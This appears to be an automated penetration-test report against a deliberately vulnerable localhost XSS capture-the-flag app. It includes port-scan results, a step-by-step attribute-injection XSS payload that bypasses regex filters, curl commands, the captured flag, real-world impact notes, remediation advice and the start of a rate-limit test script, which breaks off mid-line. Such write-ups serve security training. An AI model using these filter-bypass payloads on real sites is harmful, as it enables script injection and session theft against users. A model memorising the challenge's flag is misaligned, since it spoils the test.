The application runs on critically outdated technology (Python 2.7.18 with Flask 1.1.4, both end-of-life) and has a minimal attack surface consisting of only two public HTTP endpoints.\\n\\n### Summary by Vulnerability Type\\n\\n**Authentication Vulnerabilities:**\\n\\nThe application has a complete absence of authentication mechanisms—no login endpoints, no session management, no credential validation, and no authentication decorators. All endpoints are publicly accessible without any identity verification. Additionally, the application lacks rate limiting controls entirely, allowing unlimited automated requests without throttling. This was successfully demonstrated by sending 100 rapid automated requests with a 100% success rate, enabling unrestricted brute-force attacks, credential stuffing, enumeration, and denial-of-service through PhantomJS subprocess exhaustion. Severity: High.\\n\\n**Authorization Vulnerabilities:**\\n\\nNo authorization vulnerabilities were found. The application has no authorization mechanisms, no role-based access control, and no permission checking logic. This represents a complete absence of authorization architecture rather than bypassable controls.\\n\\n**Cross-Site Scripting (XSS) Vulnerabilities:**\\n\\nOne critical reflected XSS vulnerability was successfully exploited in the `/page` endpoint. User input from the `name` GET parameter is reflected directly into an HTML attribute context without proper encoding. The application applies weak regex-based filtering that removes HTML tag openings and quoted \\\"XSS\\\" strings, but these filters are easily bypassed using attribute-based injection techniques. Successful exploitation was achieved using the payload `\\\" onfocus=alert(\\\\`XSS\\\\`) autofocus=\\\"`, which broke out of the value attribute and injected JavaScript event handlers. The vulnerability allowed arbitrary JavaScript execution and disclosure of the CTF flag (`flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}`). The application lacks Content Security Policy (CSP) and all security headers. Severity: Critical.\\n\\n**SQL/Command Injection Vulnerabilities:**\\n\\nNo SQL or command injection vulnerabilities were found. The application has no database layer, eliminating SQL injection attack surface entirely. The single subprocess execution (PhantomJS) uses a hardcoded command array with no user input in command arguments, making command injection impossible.\\n\\n**Server-Side Request Forgery (SSRF) Vulnerabilities:**\\n\\nNo SSRF vulnerabilities were found. While the application uses PhantomJS headless browser, the URL passed to it is hardcoded as `http://localhost:5000/static/{random}.html` where the random component is generated using cryptographically secure `os.urandom(16)`. User input affects only the HTML content of the file, never the URL that PhantomJS navigates to.\\n\\n## Network Reconnaissance\\n\\n### Port and Service Discovery\\n\\nNetwork scanning via nmap revealed multiple exposed services on localhost:\\n\\n- **Port 22:** OpenSSH 9.9 (SSH service)\\n- **Port 80:** Caddy httpd (HTTP server)\\n- **Port 443:** SSL/HTTPS (no server header disclosed)\\n- **Port 445:** Microsoft-ds (SMB file sharing)\\n- **Port 631:** CUPS 2.3 (Internet Printing Protocol) with `/robots.txt` exposing a disallowed entry\\n- **Port 3703:** Unidentified service responding with HTTP 400 errors and requiring `baml-original-url` header\\n- **Port 5000 (Target):** Werkzeug/1.0.1 Python/2.7.18 - \\\"Dalgona Challenges\\\" XSS platform\\n- **Port 8000:** WSGIServer 0.2 Python/3.12.9 - \\\"SSTI Demo\\\"\\n- **Port 8001:** WSGIServer 0.2 Python/3.12.9 - \\\"SSTI Demo\\\"\\n- **Port 8888:** BaseHTTPServer 0.6 Python/3.12.9 - \\\"SSRF Test Server\\\"\\n- **Port 9001:** TOR OR Port (possible)\\n- **Port 9999:** SimpleHTTPServer 0.6 Python/3.12.9 - Directory listing enabled\\n\\n### Technology Stack Detection\\n\\nThe target application (Port 5000) runs on:\\n- **Backend:** Werkzeug/1.0.1 Python/2.7.18 (critically outdated, end-of-life)\\n- **Framework:** Flask (version not disclosed in headers, code analysis revealed Flask 1.1.4)\\n- **Title:** \\\"Dalgona Challenges\\\"\\n\\n### Subdomain Enumeration\\n\\nSubfinder discovered multiple subdomains on localhost (generic enumeration results, not application-specific):\\n- www.localhost\\n- mail.localhost, mail02.regency.localhost, mail03.regency.localhost\\n- autodiscover.localhost, autodiscover.regency.localhost\\n- owa.regency.localhost\\n- server02.counterintel.localhost, server2.hunter.localhost\\n- Various organizational subdomains (regency, naeuinc, sonoma.edu, nwcnet, 5ninesdata)\\n\\n### Security-Relevant Findings\\n\\n**Critical Exposures:**\\n- **Version Disclosure:** Multiple services leak version information in Server headers, facilitating targeted exploit development\\n- **End-of-Life Software:** Python 2.7.18 (EOL January 2020) and Flask 1.1.4 (outdated) expose the target to unpatched vulnerabilities\\n- **Directory Listing:** Port 9999 serves directory listings, potentially exposing sensitive files\\n- **SMB Exposure:** Port 445 SMB service with message signing enabled (proper configuration, but increases attack surface)\\n- **Printing Service:** CUPS 2.3 on port 631 with robots.txt indicating administrative interface protection\\n\\n**Host Script Results:**\\n- Clock skew detected: -2m32s (may affect time-based authentication/validation)\\n- SMB2 security mode properly configured with message signing required\\n\\n# Cross-Site Scripting (XSS) Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### XSS-VULN-01: Reflected XSS via HTML Attribute Injection in /page Endpoint\\n\\n**Summary:**\\n- **Vulnerable location:** `http://localhost:40095/page?name=<payload>`\\n- **Overview:** The application reflects user input from the `name` GET parameter directly into an HTML attribute context (the `value` attribute of an `<input>` element) without proper encoding. By injecting a double-quote character to break out of the attribute, an attacker can inject arbitrary HTML attributes including JavaScript event handlers. The application applies weak regex-based filtering that removes HTML tag openings (`<[a-z/]`) and quoted \\\"XSS\\\" strings (`\\\"XSS\\\"` or `'XSS'`), but these filters fail to prevent attribute-based XSS attacks.\\n- **Impact:** Successful exploitation allows arbitrary JavaScript execution in the victim's browser. In this CTF challenge, successful XSS exploitation triggers the server-side PhantomJS validation mechanism, which returns the CTF flag in the HTTP response. In a real-world application context, this would enable session hijacking, credential theft, unauthorized actions on behalf of users, and complete compromise of client-side security.\\n- **Severity:** Critical\\n\\n**Prerequisites:**\\n- Access to any web browser (Chrome, Firefox, Safari, etc.)\\n- Network connectivity to `http://localhost:40095/`\\n- No authentication required (application is completely public)\\n\\n**Exploitation Steps:**\\n\\n1. **Identify the vulnerable parameter and context**\\n\\n   The `/page` endpoint accepts a `name` GET parameter that is reflected in the HTML response:\\n   ```bash\\n   curl \\\"http://localhost:40095/page?name=test\\\"\\n   ```\\n\\n   The input is reflected into an HTML attribute context:\\n   ```html\\n   <input type=text name=name placeholder=\\\"Enter your name...\\\" value=\\\"test\\\">\\n   ```\\n\\n2. **Analyze the defensive filters**\\n\\n   The application applies two regex-based filters (as identified in code analysis):\\n   - Filter 1: `re.sub(r\\\"\\\"\\\"[\\\"']XSS[\\\"']\\\"\\\"\\\", \\\"\\\", msg, flags=re.IGNORECASE)` - Removes the literal strings `\\\"XSS\\\"` or `'XSS'`\\n   - Filter 2: `re.sub(r\\\"\\\"\\\"<[a-z/]\\\"\\\"\\\", \\\"\\\", msg, flags=re.IGNORECASE)` - Removes HTML tag openings like `<script`, `<img`, etc.\\n\\n3. **Craft attribute-based XSS payload to bypass filters**\\n\\n   Since the filters target HTML tags and quoted \\\"XSS\\\" strings, we can bypass them using:\\n   - HTML attribute injection (no angle brackets needed)\\n   - JavaScript event handlers (`onfocus`, `onclick`, `onmouseover`)\\n   - Backticks instead of quotes to avoid the `\\\"XSS\\\"` filter\\n   - The `autofocus` attribute to trigger execution automatically\\n\\n   **Payload:** `\\\" onfocus=alert(\\\\`XSS\\\\`) autofocus=\\\"`\\n\\n   **URL-encoded:** `%22%20onfocus=alert(%60XSS%60)%20autofocus=%22`\\n\\n4. **Execute the exploit via browser**\\n\\n   Navigate to the full exploitation URL:\\n   ```\\n   http://localhost:40095/page?name=%22%20onfocus=alert(%60XSS%60)%20autofocus=%22\\n   ```\\n\\n   The injected payload breaks out of the value attribute and injects event handlers:\\n   ```html\\n   <input type=text name=name placeholder=\\\"Enter your name...\\\" value=\\\"\\\" onfocus=alert(`XSS`) autofocus=\\\"\\\">\\n   ```\\n\\n5. **Observe JavaScript execution**\\n\\n   When the page loads:\\n   - The `autofocus` attribute automatically focuses the input element\\n   - The `onfocus` event handler triggers immediately\\n   - The JavaScript `alert('XSS')` executes successfully\\n   - A browser alert dialog appears with the message \\\"XSS\\\"\\n\\n6. **Capture the CTF flag from server response**\\n\\n   After the PhantomJS validation mechanism detects the successful XSS execution, the server returns the flag in the HTTP response body:\\n   ```\\n   Congratulations!\\n   Here is the flag: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}\\n   ```\\n\\n   **Alternative verification via curl:**\\n   ```bash\\n   curl -s \\\"http://localhost:40095/page?name=%22%20onfocus=alert(%60XSS%60)%20autofocus=%22\\\" | grep \\\"flag{\\\"\\n   ```\\n\\n   **Output:**\\n   ```html\\n   <p> Here is the flag: flag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}</p>\\n   ```\\n\\n**Proof of Impact:**\\n\\n**CTF Flag Successfully Captured:**\\n```\\nflag{b91f8b08-7d57-4a21-9ef3-1e247ebdd314}\\n```\\n\\n**Technical Details:**\\n- **JavaScript Execution:** Confirmed via browser alert dialog displaying \\\"XSS\\\"\\n- **Server Validation:** PhantomJS headless browser detected the `alert()` call\\n- **Flag Disclosure:** Server responded with congratulations message and flag value\\n- **Screenshot Evidence:** Visual proof of successful exploitation captured at `xss_flag_captured.png`\\n\\n**Attack Breakdown:**\\n1. Payload component `\\\"` - Breaks out of the `value=\\\"\\\"` attribute\\n2. Payload component `onfocus=alert(\\\\`XSS\\\\`)` - Injects JavaScript event handler using backticks to bypass `\\\"XSS\\\"` filter\\n3. Payload component `autofocus=\\\"\\\"` - Automatically triggers the onfocus event on page load\\n4. Final rendered HTML shows attribute injection without encoding: `value=\\\"\\\" onfocus=alert(\\\\`XSS\\\\`) autofocus=\\\"\\\"`\\n\\n**Filter Bypass Techniques Used:**\\n- **Backtick Bypass:** Used backticks (`` \\\\` ``) instead of quotes to avoid the regex filter that removes `\\\"XSS\\\"` and `'XSS'`\\n- **Attribute Injection:** Used HTML event handlers instead of HTML tags to bypass the `<[a-z/]` filter\\n- **Auto-execution:** Used `autofocus` attribute to achieve automatic execution without user interaction\\n\\n**Real-World Impact Assessment:**\\n\\nIn a production application context (beyond this CTF challenge), this vulnerability would enable:\\n\\n- **Session Hijacking:** Exfiltrate authentication cookies via `document.cookie` (assuming cookies are not HttpOnly-protected)\\n- **Credential Theft:** Inject fake login forms to phish user credentials\\n- **Unauthorized Actions:** Perform state-changing operations on behalf of the victim user (CSRF via XSS)\\n- **Information Disclosure:** Extract sensitive data from the DOM, localStorage, or sessionStorage\\n- **Malware Distribution:** Redirect users to malicious sites or trigger drive-by downloads\\n- **Keylogging:** Inject JavaScript keyloggers to capture all user input\\n- **Defacement:** Modify page content to display malicious or misleading information\\n\\n**Notes:**\\n\\n**Security Posture of Target Application:**\\n- **No Content Security Policy (CSP):** The application sends no `Content-Security-Policy` header, allowing unrestricted inline JavaScript execution\\n- **No Security Headers:** Missing `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, and other protective headers\\n- **Stateless Architecture:** No authentication cookies exist to steal (application has no session management), but this also means no HttpOnly protection\\n- **Technology Stack:** Python 2.7.18 and Flask 1.1.4 (both end-of-life and no longer receiving security updates)\\n- **Server Information:** Werkzeug/1.0.1 Python/2.7.18 (version disclosure in Server header)\\n\\n**Exploitation Environment:**\\n- Target URL: `http://localhost:40095/`\\n- Exploitation Method: Direct browser access (manual exploitation)\\n- No authentication required\\n- No rate limiting observed\\n- Exploitation complexity: Low (single HTTP request)\\n\\n**CTF-Specific Context:**\\nThis is a deliberately vulnerable CTF challenge where the intended solution is to exploit the XSS vulnerability. The PhantomJS-based detection mechanism validates successful exploitation by intercepting JavaScript `alert()`, `confirm()`, and `prompt()` calls. When exploitation is successful, the server rewards the attacker with the CTF flag. This design pattern is common in XSS training challenges but would obviously not exist in production applications.\\n\\n**Remediation Recommendations (for educational purposes):**\\n1. Apply context-appropriate output encoding (HTML attribute encoding for attribute contexts)\\n2. Use a modern template engine with automatic XSS protection (e.g., Jinja2 with auto-escaping enabled)\\n3. Implement Content Security Policy (CSP) to prevent inline JavaScript execution\\n4. Validate input using whitelists rather than blacklist-based regex filters\\n5. Upgrade to modern, supported versions of Python and Flask\\n6. Remove sensitive information disclosure (server version headers)\\n7. Implement security headers (X-Frame-Options, X-Content-Type-Options, etc.)\\n\\n# Authentication Exploitation Evidence\\n\\n## Successfully Exploited Vulnerabilities\\n\\n### AUTH-VULN-02: Absence of Rate Limiting Controls Enabling Unlimited Automated Attacks\\n\\n**Summary:**\\n- **Vulnerable location:** All endpoints (specifically tested on `/page`)\\n- **Overview:** The application accepts unlimited rapid requests without any throttling, rate limiting, or abuse detection mechanisms, enabling unrestricted brute-force attacks, credential stuffing, enumeration, and denial-of-service attacks\\n- **Impact:** An attacker can perform unlimited authentication-related attacks (credential testing, session enumeration, etc.) without being blocked or detected. Successfully demonstrated by sending 100 rapid automated requests with 100% success rate and no throttling.\\n- **Severity:** **High** - Enables automation of all authentication attack vectors without defensive controls\\n\\n**Prerequisites:**\\n- Network access to http://localhost:40095/\\n- Any HTTP client capable of sending automated requests (curl, Python requests, etc.)\\n\\n**Exploitation Steps:**\\n\\nThis exploitation demonstrates the complete absence of rate limiting by performing 100 rapid automated requests to the authentication attack surface.\\n\\n1. **Create exploitation script** to send 100 rapid requests with varying parameters:\\n\\n   ```python\\n   # File: test_rate_limiting.py\\n   import requests\\n   import time\\n   from datetime import datetime\\n\\n   target_url = \\\"http://localhost:40095/page\\\"\\n   num_requests = 100\\n\\n   results = []\\n   for i in range(num_requests):\\n       start = time.time()\\n       response = requests.get(\\n           target_url,\\n           params={\\\"name\\\": f\\\"test_user_{i}\\\"},\\n           timeout=10\\n       )\\n       elapsed = time.time() -
